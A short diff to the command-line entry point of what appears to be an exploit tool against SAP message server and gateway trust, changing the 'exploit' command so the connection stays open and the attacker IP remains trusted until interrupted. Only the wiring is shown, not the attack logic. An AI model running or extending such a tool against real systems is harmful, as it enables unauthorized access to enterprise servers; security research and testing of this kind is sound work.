@@ -1469,19 +1469,28 @@ def main() -> None:
         sys.exit(0 if result["vulnerable"] else 1)
 
     elif args.command == "exploit":
-        result = betrusted(
-            host=args.target,
-            port=port,
-            attacker_ip=args.attacker_ip,
-            instance_nr=args.instance,
-            our_name=args.our_name,
-            diag_port=args.diag_port,
-            timeout=args.timeout,
-            nilist_wait=args.nilist_wait,
-            dp_version=args.dp_version,
-            kernel_new=not args.old_kernel,
-            verbose=args.verbose,
-        )
+        # Hold the MS connection open after NILIST so the gateway trust
+        # stays active (trust is revoked when we disconnect).  Ctrl+C
+        # or SIGTERM cleanly shuts down.
+        hold = threading.Event()
+        try:
+            result = betrusted(
+                host=args.target,
+                port=port,
+                attacker_ip=args.attacker_ip,
+                instance_nr=args.instance,
+                our_name=args.our_name,
+                diag_port=args.diag_port,
+                timeout=args.timeout,
+                nilist_wait=args.nilist_wait,
+                dp_version=args.dp_version,
+                kernel_new=not args.old_kernel,
+                verbose=args.verbose,
+                stop_event=hold,
+            )
+        except KeyboardInterrupt:
+            print("\n[*] Interrupted — disconnecting from MS (trust revoked)")
+            result = {"success": True}
         sys.exit(0 if result["success"] else 1)
 
 
